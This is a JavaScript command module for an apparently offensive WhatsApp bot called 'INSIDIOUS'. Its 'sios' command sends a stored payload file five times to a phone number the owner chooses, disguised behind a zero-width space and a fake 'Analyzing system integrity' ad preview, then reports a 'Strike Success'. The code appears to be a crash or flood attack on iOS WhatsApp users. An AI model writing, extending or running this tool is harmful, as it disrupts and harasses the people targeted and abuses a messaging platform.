const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "sios",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');

        for (let i = 0; i < 5; i++) {
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    externalAdReply: { 
                        title: "🥀 INSIDIOUS V2.1.1 🥀", 
                        body: "Analyzing system integrity...", 
                        mediaType: 1, 
                        thumbnailUrl: config.menuImage 
                    },
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                } 
            });
        }
        await conn.sendMessage(conn.user.id, { text: "🥀 SIOS Strike Success." });
    }
};
